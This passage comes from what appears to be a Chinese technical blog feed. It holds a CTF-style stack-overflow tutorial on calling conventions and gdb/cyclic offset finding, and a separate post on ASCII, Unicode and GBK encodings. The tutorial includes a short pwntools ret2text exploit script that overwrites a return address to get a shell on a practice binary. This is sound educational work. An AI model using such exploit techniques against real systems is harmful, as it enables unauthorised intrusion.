src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/1f47c933242f43f4df4ea7487f699fc3.png" alt="1f47c933242f43f4df4ea7487f699fc3"></p><p>我们可以发现现在 <code>esp=ebp</code> 为什么说 <code>ret</code> 是 <code>jmp [esp]</code>呢</p><p>因为我们执行完 <code>pop ebp</code> 他就变成了这样</p><p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530153731951.png" alt="image-20250530153731951"></p><p>也就是返回到刚才call保存的返回值了 </p><p>接着我们来看下<code>x64</code>的栈 </p><p>x64分为两种编译器 在 <code>Linux、FreeBSD、macOS</code> 中普遍使用 <code>System V AMD64 ABI</code> </p><ul><li>前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</li><li>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</li></ul><p>但在<code>Windows</code>上是 <code>Microsoft x64 calling convention</code> 也称作：</p><ul><li><p>Windows x64 ABI</p></li><li><p>Windows x64 调用约定</p></li></ul><p>他的参数入栈形式如下</p><ul><li><p>前四个整型或指针参数依次保存在 <strong>RCX, RDX, R8, R9</strong>，如果还有更多的参数的话才会保存在栈上。</p></li><li><p>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</p></li></ul><h2 id="🔍-System-V-AMD64-ABI-vs-Microsoft-x64-ABI-对比"><a href="#🔍-System-V-AMD64-ABI-vs-Microsoft-x64-ABI-对比" class="headerlink" title="🔍 System V AMD64 ABI vs Microsoft x64 ABI 对比"></a>🔍 System V AMD64 ABI vs Microsoft x64 ABI 对比</h2><table><thead><tr><th>特性</th><th>System V AMD64 ABI (Linux&#x2F;macOS)</th><th>Microsoft x64 ABI (Windows x64)</th></tr></thead><tbody><tr><td>参数传递寄存器</td><td>RDI, RSI, RDX, RCX, R8, R9</td><td>RCX, RDX, R8, R9</td></tr><tr><td>返回值</td><td>RAX</td><td>RAX</td></tr><tr><td>栈空间</td><td>被调用者必须保留 <code>red zone</code>（128 字节）</td><td>无 red zone（不能用栈下方空间）</td></tr><tr><td>调用者保存（volatile）寄存器</td><td>RAX, RCX, RDX, RSI, RDI, R8–R11</td><td>RAX, RCX, RDX, R8–R11</td></tr><tr><td>被调用者保存（callee-saved）</td><td>RBX, RBP, R12–R15</td><td>RBX, RBP, RDI, RSI, R12–R15</td></tr><tr><td>参数超过寄存器</td><td>从第 7 个参数起压栈</td><td>从第 5 个参数起压栈</td></tr><tr><td>栈对齐要求</td><td>16 字节</td><td>16 字节</td></tr><tr><td>栈传参对齐方式</td><td>按参数自然大小</td><td>所有参数按 8 字节对齐</td></tr><tr><td>谁清理栈</td><td>被调用者使用 <code>leave</code>+<code>ret</code></td><td>调用者清理（隐含对齐）</td></tr></tbody></table><p>我这边就用Windows用作演示</p><p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530160001909.png" alt="image-20250530160001909"></p><p>我们也是执行到 <code>func</code> 下断点 然后我们进入这个call</p><p>我们会发现call的操作其实跟x86的call一样 也是 <code>push RIP + 5</code> 然后 <code>jmp 地址</code></p><p>但是这个地址并不是一个绝对地址而是 <strong>相对地址</strong>。</p><p><strong>相对地址跳转（RIP-relative）</strong></p><h2 id="🧮-实际跳转地址计算方式"><a href="#🧮-实际跳转地址计算方式" class="headerlink" title="🧮 实际跳转地址计算方式"></a>🧮 实际跳转地址计算方式</h2><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">目标地址 = 下一条指令地址 + 偏移量</span><br><span class="line">偏移量 = 目标地址 - 下一条指令的地址</span><br><span class="line">下一条指令的地址 = 目标地址 - 偏移量</span><br></pre></td></tr></table></figure></blockquote><p>假设当前 <code>EIP</code> 为 <code>0x1000</code>，也就是 <code>E8</code> 的位置</p><p><code>E8</code> 占 1 字节，后面是 4 字节偏移量，下一条指令的地址是：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x1000</span> + <span class="number">5</span> = <span class="number">0x1005</span></span><br></pre></td></tr></table></figure><p>加上偏移量 <code>-0x97</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x1005</span> - <span class="number">0x97</span> = <span class="number">0xF6E</span></span><br></pre></td></tr></table></figure><h2 id="为什么不用绝对地址？"><a href="#为什么不用绝对地址？" class="headerlink" title="为什么不用绝对地址？"></a>为什么不用绝对地址？</h2><p>因为：</p><ol><li><strong>可重定位性更强</strong>：相对寻址无关内存基地址，适合代码段被加载到任意地址；</li><li><strong>指令短</strong>：一个有符号 32 位偏移量足以跳转 ±2GB 的范围；</li><li><strong>兼容 RIP-relative 模型</strong>：x64 强调基于 <code>RIP</code> 的寻址方式；</li></ol><p>根据这张图我们可以计算下 <code>偏移量</code></p><p>也就是 目标地址(<code>00007FF76C6E15F0h</code>) - 下一条地址(<code>00007FF76C6E1687h</code>) &#x3D; 偏移量(<code>FFFF FFFF FFFF FF69h</code>)</p><p>因为要的是一个32位整数 我们要 截断 也就是 <code>FFFF FFFF FFFF FF69h</code> &amp; <code>FFFF FFFFh</code></p><p><code>&amp; 相同为1 不同为0</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xFFFFFFFFFFFFFF69</span> = <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">01101001</span></span><br><span class="line"><span class="number">0x00000000FFFFFFFF</span> = <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111111</span></span><br></pre></td></tr></table></figure><p>之后我们继续观察函数里面的内容</p><p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530161550126.png" alt="image-20250530161550126"></p><p>我们会发现 这边没有<code>push rbp mov rbp rsp</code> 这是为什么呢</p><p>其实这是<strong>编译器优化</strong>的结果</p><p>在 <strong>x64 系统下，编译器不一定使用帧指针（<code>rbp</code>）</strong>，因为：</p><ul><li>x64 有更多寄存器可用（16 个通用寄存器），不需要保留 <code>rbp</code>；</li><li><code>rbp</code> 被当作普通寄存器用；</li><li>栈偏移通过 <code>rsp + 偏移</code> 就可以直接访问，不需要 <code>rbp</code>；</li><li>使用 <code>rbp</code> 反而浪费一个寄存器、增加指令数。</li></ul><p>首先就是拿出来参数放到栈上进行一系列加法之后到 <code>ret</code></p><p>这里就是 <code>jmp [esp]</code>的值了</p><p>至此对函数栈的简单介绍就到这里了 然后我们要思考一个问题 ​</p><p><strong>假如函数的参数的大小是八个字节 但是我们输入了过多的字符 导致该参数占用10个字节 这会导致什么问题呢？</strong>🤔</p><h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>没错 这就导致了过多的字符覆盖了低地址处的栈空间 然而这就是 <code>栈溢出</code>  这个问题导致的漏洞危害极大 如果我们可以把输入的字符覆盖到返回地址也就是call保存的返回值处 然后我们刚好可以构造出一段恶意代码 并且让他跳转到含有关键数据的函数 例如 system 或者 拿到了shell权限 对于我们的服务器来说是一场致命打击 💥</p><p>举个例子 假如我们手里刚好有一个这样的程序 刚好有一个可以被栈溢出的函数 我们可以用 <code>gdb</code>去测试一下</p><p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530164438269.png" alt="image-20250530164438269"></p><p>根据图中所示 我们可以先用<code>gdb</code>加载 然后再 <code>main</code>函数上下个断点</p><p>我们输入 <code>r</code> 执行</p><p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530164633031.png" alt="image-20250530164633031"></p><p>他断到了这里然后我们一直走到 <code>gets</code> 这个函数</p><p>为什么要走到 <code>gets</code> 呢 因为 <code>gets</code> 这个函数他是一个输入函数 他把值输入到了栈中 但是不限制输入大小 我们可以通过这个方式 去修改最后<code>ret</code>的值</p><p>在此之前我们需要通过 <code>cyclic</code> 指令生成一堆杂乱的数据 方便我们后续直接定位栈偏移</p><p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530164851352.png" alt="image-20250530164851352"></p><p>使用 <code>ni</code> 指令单步</p><p>执行到 <code>ret</code> 指令我们就继续使用 <code>cyclic -l </code>去计算他的偏移</p><p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530172005605.png" alt="image-20250530172005605"></p><p>然后这时候我们拿到了偏移量 那么怎么构造他的shell呢 这时候我们就要用 <code>pwntools</code> 了 <code>exp</code> 如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 载入库</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment"># 打开进程</span></span><br><span class="line">p = process(<span class="string">&#x27;ret2text&#x27;</span>)</span><br><span class="line"><span class="comment"># 附加调试器</span></span><br><span class="line"><span class="comment"># gdb.attach(p) 可以观看流程</span></span><br><span class="line"><span class="comment"># 构建 payload</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(<span class="number">0x804863A</span>)</span><br><span class="line"><span class="comment"># 发送payload</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># 用户交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>执行之后是这样的</p><p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530172320533.png" alt="image-20250530172320533"></p><h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;PWN-简单栈溢出&quot;&gt;&lt;a href=&quot;#PWN-简单栈溢出&quot; class=&quot;headerlink&quot; title=&quot;PWN-简单栈溢出&quot;&gt;&lt;/a&gt;PWN-简单栈溢出&lt;/h1&gt;&lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;p&gt;pwn这门课程简单来说就是通过二进制的形式去找到某台服务器存在哪些漏洞 与web不同的是他大部分的知识都是基于汇编组成的 在 &lt;a href=&quot;https://ctf-wiki.org/pwn/linux/user-mode/environment/&quot;&gt;CTF-Wiki&lt;/a&gt; 里面的介绍则是这样的:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;程序必须向栈上写入数据。&lt;/li&gt;
&lt;li&gt;写入的数据大小没有被良好地控制。&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>编码</title>
    <link href="http://example.com/2025/05/29/%E7%BC%96%E7%A0%81/"/>
    <id>http://example.com/2025/05/29/%E7%BC%96%E7%A0%81/</id>
    <published>2025-05-29T13:32:56.000Z</published>
    <updated>2025-05-30T13:59:21.730Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h1><h1 id="ASCII编码"><a href="#ASCII编码" class="headerlink" title="ASCII编码"></a>ASCII编码</h1><blockquote><p>使用一个字节来表示字符串中的字符，称为ANSI字符串。</p><p>ASCII（American Standard Code for Information Interchange）是 <strong>美国信息交换标准代码</strong>，它使用 <strong>7 位</strong> 来表示一个字符，共定义了 128 个字符，范围是 <strong>0 ~ 127</strong>，包括：</p><p>英文字母（A<del>Z，a</del>z）</p><p>数字（0~9）</p><p>标点符号（如 <code>!</code>、<code>,</code>、<code>.</code> 等）</p><p>控制字符（如换行符 <code>\n</code>，回车 <code>\r</code>）</p><h3 id="2-在-C-语言中的表现"><a href="#2-在-C-语言中的表现" class="headerlink" title="2. 在 C 语言中的表现"></a>2. 在 C 语言中的表现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> c = <span class="string">&#x27;A&#x27;</span>;         <span class="comment">// 字符A的ASCII值是65</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;字符: %c, ASCII码: %d\n&quot;</span>, c, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符: A, ASCII码: <span class="number">65</span></span><br></pre></td></tr></table></figure></blockquote><span id="more"></span><h1 id="Unicode编码-双字节"><a href="#Unicode编码-双字节" class="headerlink" title="Unicode编码(双字节)"></a>Unicode编码(双字节)</h1><blockquote><p>Unicode是继ASCII字符编码后的另一种新型字符编码。严格意义上讲，ASCII码的每个字符使用7位表示Unicode则使用全16位表示一个字符。Unicode字符串中的每个字符均为双字节，所以又称为宽字符串。由于Unicode兼容ASCII字符，所以被大多数程序所支持，如Windows内核。Unicode的前128个字符码（十六进制，0x0000<del>0x007F）同ASCII码具有同样的字节值。比如，字母“a”的Unicode编码是0x0061，而“a”的ASCII编码是0x61。虽然占用的字节数不一样，但是两者的值是一样的。接下来的128个Unicode字符（代码为0x0080</del>0x00FF)是ISO8859-1对ASCII码的扩展。中国、日本和韩国的象形文字（总称为CJK）占用了0x3000~0x9FFF的代码。如“汉”字的Unicode编码是6C49h（其GB码为0BABAh)。 Unicode字符串不像ANSI字符串那样，保证用字符“\0”结束；如果开发者在程序设计时以字符“\0”作为Unicode字符串结尾的判断条件，就可能发生错误。</p><p>在汇编语言中，Unicode字符串被定义为一个结构体，它的定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> &#123;</span><br><span class="line">  USHORT Length;<span class="comment">//字符串长度</span></span><br><span class="line">  USHORT MaximumLength;<span class="comment">//字符串缓冲区长度</span></span><br><span class="line">  PWSTR  Buffer;<span class="comment">//字符串缓冲区</span></span><br><span class="line">&#125; UNICODE_STRING, *PUNICODE_STRING;</span><br></pre></td></tr></table></figure><p>由于我们无法保证Unicode字符串结尾一定是“\0”，所以在结构体中，字段Length定义<br>了字符串的长度。一个安全的字符串还必须限定字符的总长度，这由MaximumLength来实现。</p><ul><li>UTF-8、UTF-16、UTF-32 是 Unicode 的<strong>编码方式</strong><ul><li>UTF-8：多字节，1~4 字节</li><li>UTF-16：2 或 4 字节</li><li>UTF-32：固定 4 字节（效率低，体积大）</li></ul></li></ul><h2 id="C-语言中的示例对比"><a href="#C-语言中的示例对比" class="headerlink" title="C 语言中的示例对比"></a>C 语言中的示例对比</h2><h3 id="✅-Unicode-码点的概念（逻辑编号）"><a href="#✅-Unicode-码点的概念（逻辑编号）" class="headerlink" title="✅ Unicode 码点的概念（逻辑编号）"></a>✅ Unicode 码点的概念（逻辑编号）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;locale.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setlocale(LC_ALL, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="type">wchar_t</span> ch = <span class="string">L&#x27;你&#x27;</span>;</span><br><span class="line">    wprintf(<span class="string">L&quot;字符: %lc, Unicode码点: U+%04X\n&quot;</span>, ch, ch);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出（在 UTF-8 环境中）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符: 你, Unicode码点: U+<span class="number">4F</span>60</span><br></pre></td></tr></table></figure></blockquote><h1 id="多字节编码"><a href="#多字节编码" class="headerlink" title="多字节编码"></a>多字节编码</h1><blockquote><p>多字节编码一般都是在 ASCII 的基础上进行扩展或兼容设计的。</p><h2 id="🔷-一、为什么基于-ASCII-扩展？"><a href="#🔷-一、为什么基于-ASCII-扩展？" class="headerlink" title="🔷 一、为什么基于 ASCII 扩展？"></a>🔷 一、为什么基于 ASCII 扩展？</h2><h3 id="✅-兼容性原则"><a href="#✅-兼容性原则" class="headerlink" title="✅ 兼容性原则"></a>✅ 兼容性原则</h3><p>早期的系统、程序、协议都是基于 ASCII 设计的，为了不打破已有的英文文本和软件兼容性，后来设计的多字节编码（如 GBK、UTF-8）都：</p><ul><li>保留 ASCII 范围（0x00 ~ 0x7F）作为<strong>单字节直接使用</strong></li><li>超出 ASCII 的字符才用 <strong>多个字节组合表示</strong></li></ul><hr><h2 id="🔷-二、是如何在-ASCII-基础上扩展的？"><a href="#🔷-二、是如何在-ASCII-基础上扩展的？" class="headerlink" title="🔷 二、是如何在 ASCII 基础上扩展的？"></a>🔷 二、是如何在 ASCII 基础上扩展的？</h2><h3 id="1-ASCII-基本规则"><a href="#1-ASCII-基本规则" class="headerlink" title="1. ASCII 基本规则"></a>1. ASCII 基本规则</h3><table><thead><tr><th>字符</th><th>二进制（7位）</th><th>十六进制</th></tr></thead><tbody><tr><td>A</td><td>01000001</td><td>0x41</td></tr><tr><td>z</td><td>01111010</td><td>0x7A</td></tr><tr><td>空格</td><td>00100000</td><td>0x20</td></tr></tbody></table><blockquote><p>所有 ASCII 字符的最高位（第8位）都是 <code>0</code></p></blockquote><hr><h3 id="2-多字节编码（如-UTF-8）的扩展方式"><a href="#2-多字节编码（如-UTF-8）的扩展方式" class="headerlink" title="2. 多字节编码（如 UTF-8）的扩展方式"></a>2. 多字节编码（如 UTF-8）的扩展方式</h3><p>UTF-8 保证：</p><ul><li><code>0xxxxxxx</code> 表示 ASCII → 保留单字节（最高位为 0）</li><li>非 ASCII → 多字节以 <code>1xxxxxxx</code> 开头（高位 1）</li></ul><h4 id="UTF-8-编码示意："><a href="#UTF-8-编码示意：" class="headerlink" title="UTF-8 编码示意："></a>UTF-8 编码示意：</h4><table><thead><tr><th>编码字节数</th><th>前缀规则</th><th>可表示的字符范围</th></tr></thead><tbody><tr><td>1字节</td><td><code>0xxxxxxx</code></td><td>ASCII（U+0000 ~ U+007F）</td></tr><tr><td>2字节</td><td><code>110xxxxx 10xxxxxx</code></td><td>U+0080 ~ U+07FF</td></tr><tr><td>3字节</td><td><code>1110xxxx 10xxxxxx 10xxxxxx</code></td><td>U+0800 ~ U+FFFF</td></tr></tbody></table><h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><p>“你” 字：Unicode &#x3D; U+4F60<br> UTF-8 编码 → <code>0xE4 0xBD 0xA0</code></p><hr><h3 id="3-GBK-等编码也是类似原则"><a href="#3-GBK-等编码也是类似原则" class="headerlink" title="3. GBK 等编码也是类似原则"></a>3. GBK 等编码也是类似原则</h3><p>GBK：</p><ul><li>ASCII：0x00~0x7F，单字节直接使用</li><li>中文：0x81~0xFE 开头的多字节组合</li></ul><h4 id="示例：-1"><a href="#示例：-1" class="headerlink" title="示例："></a>示例：</h4><table><thead><tr><th>字符</th><th>GBK 编码</th></tr></thead><tbody><tr><td>A</td><td>0x41</td></tr><tr><td>“你”</td><td>0xC4 0xE3</td></tr></tbody></table><hr><h2 id="🔷-三、可视化对比"><a href="#🔷-三、可视化对比" class="headerlink" title="🔷 三、可视化对比"></a>🔷 三、可视化对比</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">diff复制编辑+----------------------+------------------------+</span><br><span class="line">| ASCII                |  0x41 (A), 0x61 (a)    |</span><br><span class="line">+----------------------+------------------------+</span><br><span class="line">| UTF-8                |  A -&gt; 0x41             |</span><br><span class="line">|                      |  你 -&gt; 0xE4 0xBD 0xA0  |</span><br><span class="line">+----------------------+------------------------+</span><br><span class="line">| GBK                  |  A -&gt; 0x41             |</span><br><span class="line">|                      |  你 -&gt; 0xC4 0xE3       |</span><br><span class="line">+----------------------+------------------------+</span><br></pre></td></tr></table></figure><p>✅ <strong>结论：</strong></p><blockquote><p>多字节编码不会破坏 ASCII 表示方式，而是在此基础上扩展更高位字符。</p></blockquote><hr><h2 id="🔷-四、C-语言验证例子：ASCII-多字节输出"><a href="#🔷-四、C-语言验证例子：ASCII-多字节输出" class="headerlink" title="🔷 四、C 语言验证例子：ASCII + 多字节输出"></a>🔷 四、C 语言验证例子：ASCII + 多字节输出</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">c复制编辑#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    char *ascii = &quot;A&quot;;     // ASCII 单字节</span><br><span class="line">    char *utf8 = &quot;你&quot;;     // UTF-8 多字节</span><br><span class="line"></span><br><span class="line">    printf(&quot;ASCII 字符: %s\n&quot;, ascii);</span><br><span class="line">    printf(&quot;UTF-8 字符: %s\n&quot;, utf8);</span><br><span class="line"></span><br><span class="line">    printf(&quot;UTF-8 字节: &quot;);</span><br><span class="line">    for (int i = 0; utf8[i] != &#x27;\0&#x27;; i++) &#123;</span><br><span class="line">        printf(&quot;%02X &quot;, (unsigned char)utf8[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">less复制编辑ASCII 字符: A</span><br><span class="line">UTF-8 字符: 你</span><br><span class="line">UTF-8 字节: E4 BD A0</span><br></pre></td></tr></table></figure><hr><h2 id="🔷-五、总结一句话"><a href="#🔷-五、总结一句话" class="headerlink" title="🔷 五、总结一句话"></a>🔷 五、总结一句话</h2><blockquote><p><strong>多字节编码方案（如 UTF-8、GBK）都是在 ASCII 基础上添加高字节区域来扩展更多语言字符，同时保持对 ASCII 的完全兼容。</strong></p></blockquote></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;编码&quot;&gt;&lt;a href=&quot;#编码&quot; class=&quot;headerlink&quot; title=&quot;编码&quot;&gt;&lt;/a&gt;编码&lt;/h1&gt;&lt;h1 id=&quot;ASCII编码&quot;&gt;&lt;a href=&quot;#ASCII编码&quot; class=&quot;headerlink&quot; title=&quot;ASCII编码&quot;&gt;&lt;/a&gt;ASCII编码&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;使用一个字节来表示字符串中的字符，称为ANSI字符串。&lt;/p&gt;
&lt;p&gt;ASCII（American Standard Code for Information Interchange）是 &lt;strong&gt;美国信息交换标准代码&lt;/strong&gt;，它使用 &lt;strong&gt;7 位&lt;/strong&gt; 来表示一个字符，共定义了 128 个字符，范围是 &lt;strong&gt;0 ~ 127&lt;/strong&gt;，包括：&lt;/p&gt;
&lt;p&gt;英文字母（A&lt;del&gt;Z，a&lt;/del&gt;z）&lt;/p&gt;
&lt;p&gt;数字（0~9）&lt;/p&gt;
&lt;p&gt;标点符号（如 &lt;code&gt;!&lt;/code&gt;、&lt;code&gt;,&lt;/code&gt;、&lt;code&gt;.&lt;/code&gt; 等）&lt;/p&gt;
&lt;p&gt;控制字符（如换行符 &lt;code&gt;&#92;n&lt;/code&gt;，回车 &lt;code&gt;&#92;r&lt;/code&gt;）&lt;/p&gt;
&lt;h3 id=&quot;2-在-C-语言中的表现&quot;&gt;&lt;a href=&quot;#2-在-C-语言中的表现&quot; class=&quot;headerlink&quot; title=&quot;2. 在 C 语言中的表现&quot;&gt;&lt;/a&gt;2. 在 C 语言中的表现&lt;/h3&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title function_&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;char&lt;/span&gt; c = &lt;span class=&quot;string&quot;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt;;         &lt;span class=&quot;comment&quot;&gt;// 字符A的ASCII值是65&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;字符: %c, ASCII码: %d&#92;n&amp;quot;&lt;/span&gt;, c, c);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;输出：&lt;/p&gt;
